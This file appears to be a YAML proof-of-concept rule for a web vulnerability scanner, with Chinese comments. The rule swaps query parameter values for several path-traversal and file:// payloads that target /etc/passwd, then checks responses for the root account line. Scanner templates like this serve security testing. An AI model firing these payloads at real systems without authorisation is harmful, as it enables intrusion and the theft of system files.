info:                                 # 基本信息部分POC的编写者可以任意进行修改。
  author: ldw                          # 编写者
  name: Arbitrary-file-read                          # 规则名称
  description: Universal                   # 规则描述
  time: 2022/10/24                    # 编写（修改）时间
  note: Universal                          # 备注信息
  reference:                          # 相关信息
    - Universal

mutate_rule:                          # 数组值，可以有多组，它们之间是And关系。
- 
  mutate_position:                    # 变异位置，表示你选择哪些位置进行变异
    query_leaf_argvalue: true             # 布尔值，表示是否对所有的query参数值进行操作

  mutate_way:                         # 数组值，变异方式。表示对你选择的变异位置进行变异的方式，可以有多组，它们之间是And关系
  - 
    pos: 3                            # 整数，只能取1，2，3其中一个，分别表示插入末尾，插入随机位置以及替换
    value: file:///etc/passwd         # 字符串，表示你想要的值
  - 
    pos: 3                            # 整数，只能取1，2，3其中一个，分别表示插入末尾，插入随机位置以及替换
    value: "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"                         # 字符串，表示你想要的值
  - 
    pos: 3                            # 整数，只能取1，2，3其中一个，分别表示插入末尾，插入随机位置以及替换
    value: ../../../../../../etc/passwd                         # 字符串，表示你想要的值
  - 
    pos: 3                            # 整数，只能取1，2，3其中一个，分别表示插入末尾，插入随机位置以及替换
    value: ..%2F..%2F..%2F..%2Fetc%2Fpasswd                         # 字符串，表示你想要的值
  - 
    pos: 3                            # 整数，只能取1，2，3其中一个，分别表示插入末尾，插入随机位置以及替换
    value: ../../../../etc/passwd                         # 字符串，表示你想要的值

response_check:                       # 数组值，输出检查，用来检查poc是否命中，多个组之间是OR关系
  -                                     # 每组内的参数之间是AND关系
    status_code:                        # 表示响应状态码
      value:                            # 需要检查的状态码的值
      operator:                         # 比较规则，可以取值1，2，3，4，5；分别代表操作是字符串包含，正则匹配，大于，小于以及等于
    resp_headers:                       # 表示响应中的headers
      value:                            # 需要检查的响应头中的值
      operator:                         # 比较规则，可以取值1，2;；分别代表操作是字符串包含，正则匹配
    resp_body:                          # 表示响应中的body
      value: root:[x*]:0:0                           # 需要检查的响应体中的值
      operator: 2                        # 比较规则，可以取值1，2；分别代表操作是字符串包含，正则匹配
